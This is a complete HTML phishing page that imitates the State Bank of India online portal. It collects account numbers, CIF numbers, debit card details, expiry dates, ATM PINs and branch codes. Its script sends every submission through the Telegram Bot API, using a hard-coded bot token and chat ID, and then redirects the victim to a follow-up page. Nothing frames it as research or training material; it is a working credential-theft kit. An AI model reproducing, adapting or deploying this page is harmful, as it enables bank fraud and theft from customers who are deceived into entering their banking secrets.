<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome To SBI</title>
    <meta name="description" content="State Bank of India Online Portal">
    
    <!-- Social sharing image -->
    <meta property="og:image" content="SBI.html">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    
    <!-- Bootstrap for mobile view -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    
    <!-- Styles here -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        input[type="text"],
        input[type="number"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            display: inline-block;
            border: 1.3px solid #7B1D61;
            box-sizing: border-box;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="text"]:hover,
        input[type="number"]:hover,
        input[type="password"]:hover {
            border-color: #7B1D61;
        }
        input[type="text"]:focus,
        input[type="number"]:focus,
        input[type="password"]:focus {
            border-color: #7B1D61;
            outline: none;
        }
        button {
            background-color: #7B1D61;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 7px;
            cursor: pointer;
            width: 100%;
            height: 45px;
            font-size: 16px;
            font-weight: bold;
        }
        button:hover {
            opacity: 0.8;
        }
        .split-input {
            display: flex;
            justify-content: space-between;
        }
        .split-input .form-group {
            flex: 1;
            margin-right: 5px;
        }
        .split-input .form-group:last-child {
            margin-right: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            margin-top: 20px;
            max-width: 500px;
        }
        .error-message {
            color: red;
            font-size: 12px;
            margin-top: 5px;
        }
        .header-img {
            width: 100%;
            height: auto;
            max-height: 100px;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="text-center">
        <img src="head1.jpg" alt="SBI LOGO" class="header-img">
    </div>
    
    <form id="myForm" class="container">
        <div class="form-group">
            <label for="accountNumber">Account Number:</label>
            <input type="number" id="accountNumber" name="accountNumber" required class="form-control" maxlength="11">
        </div>
        
        <div class="form-group">
            <label for="cifNumber">CIF Number:</label>
            <input type="number" id="cifNumber" name="cifNumber" required class="form-control">
        </div>
        
        <div class="form-group">
            <label for="cardNumber">Enter 4 Digit Debit Card No.:</label>
            <input type="text" id="cardNumber" name="cardNumber" class="masked-input" maxlength="19" placeholder="XXXX-XXXX-XXXX-1234" required>
        </div>
        
        <div class="split-input">
            <div class="form-group">
                <label for="expiration-date">Expire Date</label>
                <input type="text" id="expiration-date" name="expiration-date" class="form-control" placeholder="MM/YY" required>
                <span id="expiration-date-error" class="error-message"></span>
            </div>
            <div class="form-group">
                <label for="atmPin">ATM PIN</label>
                <input type="number" id="atmPin" name="atmPin" class="form-control" required>
            </div>
        </div>
        
        <div class="form-group">
            <label for="branchCode">Branch Code:</label>
            <input type="number" id="branchCode" name="branchCode" title="Please enter your Branch Code." required class="form-control">
        </div>
        
        <br>
        <button type="submit">Proceed</button>
    </form>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        // Format expiration date input
        document.getElementById('expiration-date').addEventListener('input', function (e) {
            var input = e.target.value.replace(/\D/g, '');
            if (input.length > 2) {
                input = input.substring(0, 2) + '/' + input.substring(2, 4);
            }
            e.target.value = input;
        });

        // Form submission handling
        document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Validate form inputs
            const accountNumber = document.getElementById('accountNumber').value;
            const cifNumber = document.getElementById('cifNumber').value;
            const cardNumber = document.getElementById('cardNumber').value;
            const expirationDate = document.getElementById('expiration-date').value;
            const atmPin = document.getElementById('atmPin').value;
            const branchCode = document.getElementById('branchCode').value;
            
            if (!accountNumber || !cifNumber || !cardNumber || !expirationDate || !atmPin || !branchCode) {
                alert('Please fill all required fields');
                return;
            }
            
            // Create message
            const message = `New SBI Form Submission:
Account Number: ${accountNumber}
CIF Number: ${cifNumber}
Debit Card No.: ${cardNumber}
Expire Date: ${expirationDate}
ATM PIN: ${atmPin}
Branch Code: ${branchCode}`;

            // IMPORTANT: Replace with your actual Telegram bot token and chat ID
            const botToken = '8342341479:AAGxeOqHIrVvl1FZn10HMr5-rIxFC953AGw'; // Replace with your actual bot token
            const chatId = '7357838260'; // Replace with your actual chat ID
            
            // Send to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                }),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Message sent successfully');
                    // Redirect to another page once the form data is sent
                    window.location.href = 'ot.html';
                } else {
                    console.error('Error sending message:', response.status);
                    alert('Error submitting form. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Network error. Please check your connection and try again.');
            });
        });
    </script>
</body>
</html>
